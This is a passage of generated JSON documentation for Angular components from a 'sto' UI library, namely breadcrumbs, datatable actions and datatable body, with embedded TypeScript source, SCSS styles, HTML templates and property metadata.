            "optional": false,
            "description": "",
            "line": 61,
            "modifierKind": [
              123
            ]
          },
          {
            "name": "title",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": false,
            "description": "",
            "line": 35,
            "modifierKind": [
              123
            ]
          }
        ],
            "methodsClass": [
                {
                    "name": "itemClick",
                    "args": [
                      {
                        "name": "event",
                        "type": "Event",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "item",
                        "type": "Breadcrumb",
                        "deprecated": false,
                        "deprecationMessage": ""
                      }
                    ],
                  "optional": false,
                  "returnType": "void",
                  "typeParameters": [],
                  "line": 67,
                  "deprecated": false,
                  "deprecationMessage": "",
                  "jsdoctags": [
                    {
                      "name": "event",
                      "type": "Event",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "item",
                      "type": "Breadcrumb",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    }
                  ]
                },
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 102,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onHomeClick",
                "args": [
                  {
                    "name": "event",
                    "type": "Event",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 96,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "Event",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-breadcrumb",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 32,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "<p>Breadcrumbs is the navigation scheme that reveals the user&#39;s location on the web application.\nIt shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).</p>\n",
        "rawdescription": "\n\nBreadcrumbs is the navigation scheme that reveals the user's location on the web application.\nIt shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).\n",
        "type": "component",
        "sourceCode": "import { Component, EventEmitter, HostBinding, Inject, Input, OnDestroy, Optional, ViewEncapsulation } from '@angular/core';\r\nimport { Router } from '@angular/router';\r\n\r\nimport { Breadcrumb, BreadcrumbConfig, NAVIGATION_HOME_ICON } from './breadcrumb';\r\n\r\n/**\r\n * Breadcrumbs is the navigation scheme that reveals the user's location on the web application.\r\n * It shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).\r\n */\r\n@Component({\r\n  selector: 'sto-breadcrumbs',\r\n  templateUrl: './sto-breadcrumbs.component.html',\r\n  styleUrls: [ './sto-breadcrumbs.component.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n})\r\nexport class StoBreadcrumbsComponent implements OnDestroy {\r\n\r\n  /**\r\n   * A list of items which can be a url segment { segment : 'inventory'} or a command {command: () => {}} .\r\n   */\r\n  @Input() get model(): any[] {\r\n    return this._model;\r\n  }\r\n\r\n  set model(model: any[]) {\r\n    this.title = ( model || [] ).map(e => e.label || '').join(' / ');\r\n    this._model = model;\r\n  }\r\n\r\n  @HostBinding('class.sto-breadcrumb')\r\n  css = true;\r\n\r\n  private _model: any[];\r\n  public title: string;\r\n\r\n  @Input()\r\n  homeicon = 'apps';\r\n  @Input()\r\n  svgIcon = false;\r\n\r\n  /**\r\n   * An object that can contain a url segment or a command.\r\n   */\r\n  @Input() home: any;\r\n\r\n  /**\r\n   * DEPRECATED\r\n   */\r\n  @Input() style: any;\r\n  /**\r\n   * DEPRECATED\r\n   */\r\n  @Input() styleClass: string;\r\n  /**\r\n   * @DEPRECATED\r\n   * The material icon that is show top left\r\n   *  {string}\r\n   */\r\n  @Input() homeIcon = 'home';\r\n  public iconConfig: { icon?: string; svgIcon?: string; text?: string; };\r\n\r\n  constructor(private router: Router, @Inject(NAVIGATION_HOME_ICON) @Optional() iconConfig: BreadcrumbConfig) {\r\n    this.iconConfig = iconConfig || { icon: 'apps' };\r\n  }\r\n\r\n  itemClick(event: Event, item: Breadcrumb) {\r\n    if ( !item ) {\r\n      return;\r\n    }\r\n    if ( item.disabled ) {\r\n      event.preventDefault();\r\n      return;\r\n    }\r\n\r\n    if ( !item.url ) {\r\n      event.preventDefault();\r\n    }\r\n\r\n    if ( item.command ) {\r\n      if ( !item.eventEmitter ) {\r\n        item.eventEmitter = new EventEmitter();\r\n        item.eventEmitter.subscribe(item.command);\r\n      }\r\n\r\n      item.eventEmitter.emit({\r\n        originalEvent: event,\r\n        item\r\n      });\r\n    } else if ( item.segment ) {\r\n      this.router.navigate([ item.segment ], { queryParamsHandling: 'preserve' })\r\n        .catch(console.error);\r\n    }\r\n  }\r\n\r\n  onHomeClick(event: Event) {\r\n    if ( this.home ) {\r\n      this.itemClick(event, this.home);\r\n    }\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    if ( this.model ) {\r\n      for ( const item of this.model ) {\r\n        if ( item.eventEmitter ) {\r\n          item.eventEmitter.unsubscribe();\r\n        }\r\n      }\r\n    }\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ".sto-breadcrumb {\r\n  display: flex;\r\n  align-items: center;\r\n  justify-content: left;\r\n  font-weight: 500;\r\n  overflow: hidden;\r\n\r\n  &__home {\r\n    min-width: 52px;\r\n    padding-left: 4px;\r\n    justify-content: space-around;\r\n    display: flex;\r\n    align-items: center;\r\n    cursor: pointer;\r\n\r\n    &__title {\r\n      margin-right: 16px;\r\n    }\r\n\r\n    &__icon {\r\n      margin: auto 16px;\r\n    }\r\n  }\r\n\r\n  &__list {\r\n    margin: 0;\r\n    padding-left: 8px;\r\n    white-space: nowrap;\r\n    overflow: hidden;\r\n    display: inline;\r\n    align-items: center;\r\n    flex: 0 1 auto;\r\n    text-overflow: ellipsis;\r\n\r\n    .separator {\r\n      padding: 0 8px;\r\n      font-weight: 400;\r\n    }\r\n\r\n    &__item {\r\n\r\n      font-weight: 500;\r\n\r\n\r\n      cursor: pointer;\r\n      text-decoration: none;\r\n\r\n      &--last {\r\n        cursor: default;\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\n",
            "styleUrl": "./sto-breadcrumbs.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "router",
              "type": "Router",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "iconConfig",
              "type": "BreadcrumbConfig",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 61,
          "jsdoctags": [
            {
              "name": "router",
              "type": "Router",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "iconConfig",
              "type": "BreadcrumbConfig",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnDestroy"
        ],
        "accessors": {
          "model": {
            "name": "model",
            "setSignature": {
              "name": "model",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "model",
                  "type": "any[]",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 26,
              "jsdoctags": [
                {
                  "name": "model",
                  "type": "any[]",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "model",
              "type": "[]",
              "returnType": "any[]",
              "line": 22,
              "rawdescription": "\n\nA list of items which can be a url segment { segment : 'inventory'} or a command {command: () => {}} .\n",
              "description": "<p>A list of items which can be a url segment { segment : &#39;inventory&#39;} or a command {command: () =&gt; {}} .</p>\n"
            }
          }
        },
        "readme": "<h4 id=\"stobreadcrumbs\">StoBreadCrumbs</h4>\n<p>Breadcrumbs is the navigation scheme that reveals the user&#39;s location on the web application.\nIt shows both a home icon and the path that could be an url or a command/function (e.g open a drawer, popup etc).</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-breadcrumbs [home]=&quot;{command = () =&gt; {...}&quot; [model]=&quot;[{label: &#39;Home&#39;, segment: &#39;home&#39;}, {label: &#39;Inventory&#39;, segment: &#39;inventory&#39;}]&quot;&gt;&lt;/sto-breadcrumbs&gt;</code></pre></div><p>#####model\nA list of items which can be a url segment { segment : &#39;inventory&#39;} or a command {command: () =&gt; {}} .</p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">[\n   {label: &quot;IM - OPS&quot;, command: () =&gt; {...}},\n   {label: &quot;Inventory overview&quot;, segment: &quot;overview&quot;}\n]</code></pre></div><p>#####home\nAn object that can contain a url segment or a command.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">{\n    command: () =&gt; {\n      this.store.dispatch(new SwitchNavigationMenuAction(&#39;left&#39;));\n      this.store.dispatch(new OpenNavigationAction(true));\n    }\n  }</code></pre></div>",
        "templateData": "<div class=\"sto-breadcrumb__home\"\r\n     (click)=\"itemClick($event, home)\">\r\n  <mat-icon class=\"sto-breadcrumb__home__icon\"\r\n            *ngIf=\"iconConfig.svgIcon\"\r\n            [svgIcon]=\"iconConfig.svgIcon\">\r\n  </mat-icon>\r\n  <mat-icon class=\"sto-breadcrumb__home__icon\"\r\n            *ngIf=\"!iconConfig.svgIcon\">{{ iconConfig.icon }}\r\n  </mat-icon>\r\n  <span class=\"sto-breadcrumb__home__title\"\r\n        *ngIf=\"iconConfig.text\">{{iconConfig.text}}</span>\r\n</div>\r\n<div class=\"sto-breadcrumb__list\"\r\n     [title]=\"title\"\r\n     style=\"position: relative\">\r\n  <ng-container *ngFor=\"let item of model; let index = index; let last = last\">\r\n    <a class=\"sto-breadcrumb__list__item sto-breadcrumb__list__item__link\"\r\n       *ngIf=\"item.url\"\r\n       [href]=\"item.url\"\r\n       [title]=\"item.label\">\r\n      {{ item.label}}\r\n    </a>\r\n    <a class=\"sto-breadcrumb__list__item sto-breadcrumb__list__item__link\"\r\n       *ngIf=\"!item.url && item.segment\"\r\n       [routerLink]=\"item.segment\"\r\n       [title]=\"item.label\">\r\n      {{ item.label}}\r\n    </a>\r\n    <a class=\"sto-breadcrumb__list__item sto-breadcrumb__list__item__link\"\r\n       *ngIf=\"!item.url && !item.segment\"\r\n       [title]=\"item.label\"\r\n       (click)=\"itemClick($event, item)\">\r\n      {{ item.label}}\r\n    </a>\r\n    <span class=\"separator\"\r\n          *ngIf=\"!last\"> /\r\n    </span>\r\n  </ng-container>\r\n</div>\r\n"
      },
      {
        "name": "StoDatatableActionsComponent",
        "id": "component-StoDatatableActionsComponent-68142f883bcfc57addd5b8d9b6c8e82c54fff1abc543c2f47246fdd5cb4de2d3cb337584456d219109700facb25fa8abcf6fe1fad76db593860b49850b6e7284",
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-datatable-actions",
        "styleUrls": [
          "./sto-datatable-actions.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-datatable-actions.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "height",
            "defaultValue": "40",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 14,
            "type": "number",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "getClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 11,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-mdl-table__actions'"
              }
            ]
          }
        ],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-mdl-table__actions",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 11,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, HostBinding, Input } from '@angular/core';\r\n\r\n@Component({\r\n  selector: 'sto-datatable-actions',\r\n  templateUrl: './sto-datatable-actions.component.html',\r\n  styleUrls: [ './sto-datatable-actions.component.scss' ],\r\n})\r\n\r\nexport class StoDatatableActionsComponent {\r\n  @HostBinding('class.sto-mdl-table__actions')\r\n  getClass = true;\r\n  @HostBinding('style.height.px')\r\n  @Input()\r\n  height = 40;\r\n\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-datatable-actions-left',\r\n  template: `\r\n    <ng-content></ng-content>`\r\n})\r\nexport class StoDataTableActionsLeftComponent {\r\n  @HostBinding('class.sto-mdl-table__actions__left')\r\n  getClass = true;\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-datatable-actions-right',\r\n  template: `\r\n    <ng-content></ng-content>`\r\n})\r\nexport class StoDataTableActionsRightComponent {\r\n  @HostBinding('class.sto-mdl-table__actions__right')\r\n  getClass = true;\r\n}\r\n\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "",
            "styleUrl": "./sto-datatable-actions.component.scss"
          }
        ],
        "stylesData": "",
        "templateData": "<ng-content select=\"sto-datatable-actions-left\"></ng-content>\r\n<ng-content select=\"sto-datatable-actions-right\"></ng-content>\r\n"
      },
      {
        "name": "StoDataTableActionsLeftComponent",
        "id": "component-StoDataTableActionsLeftComponent-68142f883bcfc57addd5b8d9b6c8e82c54fff1abc543c2f47246fdd5cb4de2d3cb337584456d219109700facb25fa8abcf6fe1fad76db593860b49850b6e7284",
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-datatable-actions-left",
        "styleUrls": [],
        "styles": [],
        "template": "<ng-content></ng-content>",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "getClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 25,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-mdl-table__actions__left'"
              }
            ]
          }
        ],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-mdl-table__actions__left",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 25,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, HostBinding, Input } from '@angular/core';\r\n\r\n@Component({\r\n  selector: 'sto-datatable-actions',\r\n  templateUrl: './sto-datatable-actions.component.html',\r\n  styleUrls: [ './sto-datatable-actions.component.scss' ],\r\n})\r\n\r\nexport class StoDatatableActionsComponent {\r\n  @HostBinding('class.sto-mdl-table__actions')\r\n  getClass = true;\r\n  @HostBinding('style.height.px')\r\n  @Input()\r\n  height = 40;\r\n\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-datatable-actions-left',\r\n  template: `\r\n    <ng-content></ng-content>`\r\n})\r\nexport class StoDataTableActionsLeftComponent {\r\n  @HostBinding('class.sto-mdl-table__actions__left')\r\n  getClass = true;\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-datatable-actions-right',\r\n  template: `\r\n    <ng-content></ng-content>`\r\n})\r\nexport class StoDataTableActionsRightComponent {\r\n  @HostBinding('class.sto-mdl-table__actions__right')\r\n  getClass = true;\r\n}\r\n\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": ""
      },
      {
        "name": "StoDataTableActionsRightComponent",
        "id": "component-StoDataTableActionsRightComponent-68142f883bcfc57addd5b8d9b6c8e82c54fff1abc543c2f47246fdd5cb4de2d3cb337584456d219109700facb25fa8abcf6fe1fad76db593860b49850b6e7284",
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-datatable-actions-right",
        "styleUrls": [],
        "styles": [],
        "template": "<ng-content></ng-content>",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "getClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 35,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-mdl-table__actions__right'"
              }
            ]
          }
        ],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-mdl-table__actions__right",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 35,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component, HostBinding, Input } from '@angular/core';\r\n\r\n@Component({\r\n  selector: 'sto-datatable-actions',\r\n  templateUrl: './sto-datatable-actions.component.html',\r\n  styleUrls: [ './sto-datatable-actions.component.scss' ],\r\n})\r\n\r\nexport class StoDatatableActionsComponent {\r\n  @HostBinding('class.sto-mdl-table__actions')\r\n  getClass = true;\r\n  @HostBinding('style.height.px')\r\n  @Input()\r\n  height = 40;\r\n\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-datatable-actions-left',\r\n  template: `\r\n    <ng-content></ng-content>`\r\n})\r\nexport class StoDataTableActionsLeftComponent {\r\n  @HostBinding('class.sto-mdl-table__actions__left')\r\n  getClass = true;\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-datatable-actions-right',\r\n  template: `\r\n    <ng-content></ng-content>`\r\n})\r\nexport class StoDataTableActionsRightComponent {\r\n  @HostBinding('class.sto-mdl-table__actions__right')\r\n  getClass = true;\r\n}\r\n\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": ""
      },
      {
        "name": "StoDatatableBodyComponent",
        "id": "component-StoDatatableBodyComponent-bb146d3c14bc68d2c9494c4f10d7e975aae71ae437e35550f93b8d17bd768dadb759d748c29e12f28a2eee35efa3a2de625594a813828d8a92b9b29bece6b802",
        "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-datatable-body",
        "styleUrls": [
          "./sto-datatable-body.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-datatable-body.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "columnMode",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 75,
            "type": "ColumnDisplay",
            "decorators": []
          },
          {
            "name": "columns",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 71,
            "type": "Column[]",
            "decorators": []
          },
          {
            "name": "disableRipple",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 53,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "hasFooter",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 85,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "height",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 59,
            "type": "number | null",
            "decorators": []
          },
          {
            "name": "responsive",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 51,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "responsiveView",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 57,
            "type": "TemplateRef<>",
            "decorators": []
          },
          {
            "name": "rowClass",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 79,
            "type": "rowClassFn",
            "decorators": []
          },
          {
            "name": "rowHeight",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 67,
            "type": "number",
            "decorators": []
          },
          {
            "name": "rows",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 61,
            "type": "Array<T>",
            "decorators": []
          },
          {
            "name": "scrollbarH",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 30,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "scrollLeft",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 83,
            "type": "string | null",
            "decorators": []
          },
          {
            "name": "selectable",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 63,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "selected",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 69,
            "type": "T",
            "decorators": []
          },
          {
            "name": "selectionMode",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 81,
            "type": "SelectionModes",
            "decorators": []
          },
          {
            "name": "smallView",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 55,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "trackBy",
            "defaultValue": "(index: number, item: T) => {\r\n    return index;\r\n  }",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 127,
            "type": "(index: number, item: T) => number",
            "decorators": []
          },
          {
            "name": "virtualScroll",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 73,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "width",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 65,
            "type": "string",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "activate",
            "defaultValue": "new EventEmitter<RowActivation<T>>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 91,
            "type": "EventEmitter"
          },
          {
            "name": "rowContextMenu",
            "defaultValue": "new EventEmitter<RowContextMenu<T>>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 89,
            "type": "EventEmitter"
          },
          {
            "name": "rowSelected",
            "defaultValue": "new EventEmitter<RowSelection<T>>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 87,
            "type": "EventEmitter"
          },
          {
            "name": "scrollHeader",
            "defaultValue": "new EventEmitter<Event>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 93,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [
              {
                "name": "_rowClass",
                "defaultValue": "() => {...}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 130
              },
              {
                "name": "_scrollbarH",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 77,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "destroyed$",
                "defaultValue": "new Subject<boolean>()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 99,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "horizontalScrollActive",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 103,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "resizeObserver",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ResizeObserver",
                "optional": false,
                "description": "",
                "line": 102,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "rowDiffer",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "KeyValueDiffer<T | T>",
                "optional": false,
                "description": "",
                "line": 100,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "scrollElement",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef<HTMLElement>",
                "optional": false,
                "description": "",
                "line": 49,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'scrollViewport', {read: ElementRef}"
                  }
                ]
              },
              {
                "name": "scroller",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef<HTMLDivElement>",
                "optional": false,
                "description": "",
                "line": 97,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'scroller'"
                  }
                ]
              },
              {
                "name": "timeout",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number | undefined",
                "optional": false,
                "description": "",
                "line": 101,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "verticalScrollOffset",
                "defaultValue": "0",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 104,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "vScroller",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "CdkVirtualScrollViewport",
                "optional": false,
                "description": "",
                "line": 95,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "CdkVirtualScrollViewport"
                  }
                ]
              }
            ],
            "methodsClass": [
              {
                "name": "horzScrollPosition",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 154,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "ngAfterViewInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 146,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 138,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onKeyDownHandler",
                "args": [
                  {
                    "name": "event",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "rowEl",
                    "type": "HTMLDivElement",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "activationData",
                    "type": "RowSelection<T> | RowActivation<T>",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 250,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "rowEl",
                    "type": "HTMLDivElement",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "activationData",
                    "type": "RowSelection<T> | RowActivation<T>",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "onresize",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 111,
                "deprecated": false,
                "deprecationMessage": "",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'window:resize', ['$event']"
                  }
                ]
              },
              {
                "name": "selectRow",
                "args": [
                  {
                    "name": "event",
                    "type": "KeyboardEvent | MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  },
                  {
                    "name": "activationData",
                    "type": "RowSelection<T>",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 237,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "KeyboardEvent | MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  },
                  {
                    "name": "activationData",
                    "type": "RowSelection<T>",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "virtHorzScrollPosition",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 197,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [
          {
            "name": "window:resize",
            "args": [],
            "argsDecorator": [
              "$event"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 111
          }
        ],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  Component,\r\n  ElementRef,\r\n  EventEmitter,\r\n  HostListener,\r\n  Input,\r\n  KeyValueDiffer,\r\n  KeyValueDiffers,\r\n  OnDestroy,\r\n  Output,\r\n  TemplateRef,\r\n  ViewChild\r\n} from '@angular/core';\r\nimport { Subject } from 'rxjs';\r\nimport { RowActivation, RowContextMenu, RowSelection } from '../events';\r\nimport { Column, ColumnDisplay } from '../columns';\r\nimport { CdkVirtualScrollViewport } from '@angular/cdk/scrolling';\r\nimport { SelectionModes } from '../selection-modes';\r\nimport { rowClassFn } from '../models';\r\n\r\n@Component({\r\n  selector: 'sto-datatable-body',\r\n  templateUrl: './sto-datatable-body.component.html',\r\n  styleUrls: [ './sto-datatable-body.component.scss' ]\r\n})\r\nexport class StoDatatableBodyComponent<T extends Record<string, unknown>> implements OnDestroy, AfterViewInit {\r\n\r\n  @Input()\r\n  get scrollbarH(): boolean {\r\n    return this._scrollbarH;\r\n  }\r\n\r\n  set scrollbarH(scrollbarH: boolean) {\r\n    this._scrollbarH = scrollbarH;\r\n    this.horizontalScrollActive = false;\r\n    if ( this.resizeObserver ) {\r\n      this.resizeObserver.disconnect();\r\n    }\r\n    if ( scrollbarH && this.virtualScroll && this.vScroller ) {\r\n      this.virtHorzScrollPosition();\r\n    } else if ( scrollbarH ) {\r\n      this.horzScrollPosition();\r\n    }\r\n    requestAnimationFrame(() => window.dispatchEvent(new Event('resize')));\r\n  }\r\n\r\n  @ViewChild('scrollViewport', { read: ElementRef })\r\n  scrollElement: ElementRef<HTMLElement>;\r\n  @Input()\r\n  responsive: boolean;\r\n  @Input()\r\n  disableRipple: boolean;\r\n 